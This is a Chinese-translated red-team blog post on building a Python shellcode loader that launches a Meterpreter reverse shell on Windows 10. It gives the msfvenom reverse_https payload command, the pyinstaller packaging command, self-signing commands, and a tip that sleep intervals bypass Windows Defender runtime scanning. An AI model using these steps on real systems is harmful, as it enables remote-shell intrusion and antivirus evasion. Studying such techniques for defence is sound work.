<html>
<head>
<title>Pythonic Malware: Evading Detection with Compiled Executables</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Pythonic恶意软件:通过编译的可执行文件逃避检测</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/pythonic-malware-evading-detection-with-compiled-executables-20194ab0719c?source=collection_archive---------2-----------------------#2022-04-11">https://infosecwriteups.com/pythonic-malware-evading-detection-with-compiled-executables-20194ab0719c?source=collection_archive---------2-----------------------#2022-04-11</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/8f9437a38ddecef27927c9a2a2ea7a70.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*FY1ZOevC6osF5ubg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">照片由<a class="ae kc" href="https://unsplash.com/@kobbyfotos?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">科比·门德斯</a>在<a class="ae kc" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄</figcaption></figure><p id="1713" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在攻击性安全约定期间创建Python可执行文件曾经是一种有效的规避方法。然而，这种策略在现代Windows终端上变得越来越困难。</p><p id="495e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">事实上，即使是良性的程序似乎也会在接触磁盘后立即被阻止。这只是red teamers从流行的框架如<a class="ae kc" href="https://github.com/Veil-Framework/Veil-Evasion" rel="noopener ugc nofollow" target="_blank">面纱规避</a>转向更大更好的东西的原因之一。</p><p id="8416" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这篇文章回顾了编译的Python在攻击性安全测试中的使用，并分享了我在完全修补的Windows 10系统上启动Meterpreter shells来对抗Windows Defender的经验。</p></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><h1 id="8b17" class="li lj iq bd lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf bi translated">恶意软件创建</h1><p id="67fa" class="pw-post-body-paragraph kd ke iq kf b kg mg ki kj kk mh km kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">鉴于我主要关注的是编译后的可执行文件中的规避策略，我创建了一个简单的外壳代码加载器作为我的“恶意软件”。该脚本调用常见的Windows函数，如<code class="fe ml mm mn mo b">VirtualAlloc</code> &amp; <code class="fe ml mm mn mo b">CreateThread</code>在当前进程中本地注入外壳代码。</p><p id="f5ad" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有效载荷本身利用了通过端口443的<code class="fe ml mm mn mo b">reverse_https</code>连接，由MSFVenom生成，没有任何编码或混淆技术:</p><pre class="mp mq mr ms gt mt mo mu mv aw mw bi"><span id="0448" class="mx lj iq mo b gy my mz l na nb">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.157 LPORT=443 -f py</span></pre><p id="5129" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这一点上，我对代码没有多少信心，认为它肯定会被检测到。但是，当尝试直接执行Python脚本时，不会触发任何警报，并且会建立反向连接。</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nc"><img src="../Images/b2dac6251a55353988e7e042200b3481.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_nBKODL8wYAOlUgILbM6-Q.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">作者照片</figcaption></figure></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><h1 id="79af" class="li lj iq bd lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf bi translated">编译Python</h1><p id="abd5" class="pw-post-body-paragraph kd ke iq kf b kg mg ki kj kk mh km kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">尽管触发了一个成功的Meterpreter shell，但我不能指望Python安装在每个Windows工作站上。因此，下一步是编译源代码——使其可执行，而不需要主机上的任何额外资源。</p><p id="d46c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">使用<code class="fe ml mm mn mo b">pyinstaller</code>、<code class="fe ml mm mn mo b"> py2exe</code>或<code class="fe ml mm mn mo b">cx_freeze</code>等工具编译Python。这些通过将脚本的字节码版本(<code class="fe ml mm mn mo b">.pyc</code>)和所有需要的依赖/解释器打包到一个单独的<code class="fe ml mm mn mo b">.exe</code>文件中来实现:</p><pre class="mp mq mr ms gt mt mo mu mv aw mw bi"><span id="99dc" class="mx lj iq mo b gy my mz l na nb">pyinstaller --onefile .\shellcode_loader.py</span></pre><p id="237e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">不幸的是，在将新编译的<code class="fe ml mm mn mo b">shellcode_loader.exe</code>下载到目标系统上时，我没走多远就收到了以下警告:</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/aefb95637b60795bb82a8018e65b8174.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/format:webp/1*LIrJ4ABnlYIK2smjaHlrvw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">作者照片</figcaption></figure></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><h1 id="68d2" class="li lj iq bd lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf bi translated">逃避检测</h1><h2 id="f949" class="mx lj iq bd lk ne nf dn lo ng nh dp ls ko ni nj lw ks nk nl ma kw nm nn me no bi translated">代码签名</h2><p id="42ed" class="pw-post-body-paragraph kd ke iq kf b kg mg ki kj kk mh km kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">此时，我考虑了避免检测的潜在策略，并研究了用自签名证书对可执行文件进行签名。</p><p id="b635" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">使用Visual Studio Developer命令提示符，我执行了以下命令来生成一个证书并对<code class="fe ml mm mn mo b">shellcode_loader.exe</code>文件进行签名。</p><pre class="mp mq mr ms gt mt mo mu mv aw mw bi"><span id="3b56" class="mx lj iq mo b gy my mz l na nb">&gt;&gt; makecert /r /h 0 /eku "1.3.6.1.5.5.7.3.3,1.3.6.1.4.1.311.10.3.13" /e 12/12/2025 /sv m8.pvk m8.cer</span><span id="0667" class="mx lj iq mo b gy np mz l na nb">&gt;&gt; <!-- -->pvk2pfx /pvk m8.pvk /spc m8.cer /pfx m8.pfx</span><span id="f02b" class="mx lj iq mo b gy np mz l na nb">&gt;&gt; <!-- -->signtool sign /a /fd SHA256 /f m8.pfx shellcode_loader.exe</span></pre><p id="1ffd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在，查看文件的属性，“Joe's-Software-Emporium”列在数字签名详细信息— <em class="nq">(微软默认)</em>下。这样，可执行文件就可以被下载而不被检测到。</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nr"><img src="../Images/7a4578cb5e835d8f6b324432f72ab43e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MeQu9Owe6vC7gHUX79_A8A.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">作者照片</figcaption></figure><h2 id="01d0" class="mx lj iq bd lk ne nf dn lo ng nh dp ls ko ni nj lw ks nk nl ma kw nm nn me no bi translated">睡眠间隔</h2><p id="1390" class="pw-post-body-paragraph kd ke iq kf b kg mg ki kj kk mh km kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">尽管可以下载该文件，但Windows Defender在尝试执行时仍会标记该程序。这时候我想起了阅读<a class="ae kc" href="https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/" rel="noopener ugc nofollow" target="_blank"> F-Secure关于逃避Windows Defender运行时扫描的帖子</a>，其中提供了许多很好的提示。</p><p id="622d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">简而言之，我发现在Win32 API调用之间添加各种睡眠间隔绕过了运行时扫描，并成功触发了一个工作的反向shell。</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/4741b00959e59095ada801237ab014fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K8rHe92P_whS3d7NSxqVaA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">作者照片</figcaption></figure></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><h1 id="8718" class="li lj iq bd lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf bi translated">结论</h1><p id="749b" class="pw-post-body-paragraph kd ke iq kf b kg mg ki kj kk mh km kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">在真正的red团队合作中，编译的Python可执行文件不会是我的第一选择。然而，这是一个有趣的概念验证，可能在攻击性安全测试的其他领域有用。</p><p id="60b1" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我的<code class="fe ml mm mn mo b"> shellcode_loader.py</code>脚本的最终副本可以在<strong class="kf ir"> </strong> <a class="ae kc" href="https://gist.github.com/m8sec/864c1feb9718e21df06e9bc5bb52f60f" rel="noopener ugc nofollow" target="_blank"> <strong class="kf ir"> GitHub </strong> </a>上找到。</p></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><p id="4aa7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">感谢阅读！在<a class="ae kc" href="https://m8sec.dev" rel="noopener ugc nofollow" target="_blank"> m8sec.dev </a>了解更多关于我的信息，并关注更多攻击性安全内容。</p><p id="1c1e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="nq">免责声明:所有内容仅用于教育目的。作者不对信息的使用负责。不要对你不拥有或没有明确许可的系统进行测试。</em></p></div></div>    
</body>
</html>